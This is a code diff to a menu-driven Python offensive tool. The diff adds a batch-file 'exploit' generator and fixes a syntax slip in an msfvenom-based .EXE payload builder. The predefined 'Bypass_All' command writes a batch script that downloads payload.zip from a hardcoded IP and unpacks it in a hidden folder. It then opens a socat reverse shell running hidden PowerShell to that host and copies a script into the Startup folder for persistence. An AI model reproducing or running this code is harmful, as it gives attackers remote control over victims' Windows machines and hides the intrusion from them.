@@ -172,7 +172,7 @@ def main_menu():
 def make_exploits_menu():
     print_centered("Make Exploits Menu")
     print_shifted_left("[1] .EXE Exploit")
-    print_shifted_left("[2] .HTA Exploits")
+    print_shifted_left("[2] .BAT Exploits")
     print_shifted_left("[3] Go Back")
     print()
     print("Tip: Select an option by entering the corresponding number!")
@@ -188,8 +188,7 @@ def make_exploits_menu():
     elif choice == '2':
         clear_screen()
         print_fade_banner()
-        files = os.listdir('.')
-        print(f"Files in Directory: {files}")
+        batch_file_menu()
         make_exploits_menu()
     elif choice == '3':
         clear_screen()
@@ -231,6 +230,24 @@ def listener_exploits_menu():
     clear_screen()
     print_fade_banner()
     listener_exploits_menu()
+
+def batch_file_menu():
+    print_centered("Batch File Creation Menu")
+    print_shifted_left("1. Use Predefined Commands")
+    print_shifted_left("2. Enter Custom Commands")
+    print_shifted_left("3. Go Back")
+    print()
+    print("Tip: Select an option by entering the corresponding number!")
+    print()
+    choice = input("Select an option: ")
+
+    if choice == '1' or choice == '2':
+        create_batch_file_workflow(choice)
+    elif choice == '3':
+        main_menu()
+    else:
+        print("Invalid option, try again.")
+        batch_file_menu()
 
 # ---------------------------------------listener menu options----------------------------------------
 
@@ -282,7 +299,7 @@ def make_exe_exploits():
             "exe",
             "-o",
             "exploit.exe"
-        ], check=True)s
+        ], check=True)
         print("Payload created successfully.")
     except subprocess.CalledProcessError as e:
         print(f"Error occurred while creating the payload: {e}")
@@ -290,6 +307,82 @@ def make_exe_exploits():
         print("msfvenom is not installed. Please install msfvenom and try again.")
     except Exception as e:
         print(f"An unexpected error occurred: {e}")
+
+predefined_bat_commands = {
+    1: "@Echo off"
+        "\npowershell -WindowStyle Hidden new-item C:\Temp -ItemType Directory"
+        '\nstart /MIN powershell -WindowStyle Hidden curl -Uri "http://194.195.114.92/payload.zip" -OutFile C:\Temp\payload.zip'
+        "\npowershell.exe -WindowStyle Hidden ping -n 5 localhost >nul"
+        "\nstart /MIN powershell -WindowStyle Hidden Expand-Archive C:\Temp\payload.zip -DestinationPath C:\Temp"
+        "\npowershell.exe -WindowStyle Hidden ping -n 3 localhost >nul"
+        "\nstart /MIN C:\Temp\payload\socat OPENSSL:194.195.114.92:4443,verify=0 EXEC:'powershell.exe -WindowStyle Hidden',pipes"
+        '\nxcopy /s "C:\Temp\payload\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" /K /D /H /Y'
+        "\npowershell -WindowStyle Hidden del C:\Temp\payload.zip"
+        "\npowershell -WindowStyle Hidden attrib +h +s C:\Temp"
+}
+
+def create_batch_file(filename, commands):
+    try:
+        # Add .bat extension if not provided
+        if not filename.endswith('.bat'):
+            filename += '.bat'
+
+        # Create and open the .bat file for writing
+        with open(filename, 'w') as batch_file:
+            # Write the commands into the .bat file
+            for command in commands:
+                batch_file.write(command + '\n')
+
+        print(f"Batch file '{filename}' created successfully!")
+    except Exception as e:
+        print(f"Error creating batch file: {e}")
+
+# Function to display predefined commands
+def show_predefined_commands():
+    print()
+    print_shifted_left("[1] Bypass_All")
+    print()
+    print("Tip: Select an option by entering the corresponding number!")
+    print("Type 'custom' to enter your own command or 'done' to finish.")
+    print()
+
+# Function to get commands from user
+def get_user_commands():
+    commands = []
+    print("\nEnter the commands you want to add to the batch file.")
+    
+    while True:
+        # Show predefined commands and prompt for user input
+        show_predefined_commands()
+        choice = input("Select an option (or type 'custom' to enter manually): ").lower()
+
+        if choice == 'done':
+            break
+        elif choice == 'custom':
+            # If the user wants to enter a custom command
+            custom_command = input("Enter your custom command: ")
+            commands.append(custom_command)
+        elif choice.isdigit() and int(choice) in predefined_bat_commands:
+            # If a predefined command is selected
+            commands.append(predefined_bat_commands[int(choice)])
+        else:
+            print("Invalid choice, please try again.")
+    
+    return commands
+
+def create_batch_file_workflow(choice):
+    filename = input("\nEnter the name of the batch file: ")
+
+    if choice == '1':
+        print("\nYou selected predefined commands.")
+        commands = get_user_commands()  # Get predefined or custom commands
+    elif choice == '2':
+        print("\nYou selected custom commands.")
+        commands = get_user_commands()  # Get predefined or custom commands
+
+    create_batch_file(filename, commands)  # Create the batch file with the commands
+    main_menu()  # Return to main menu
+
 
 # ---------------------------------------Errors | Exit program----------------------------------------
 
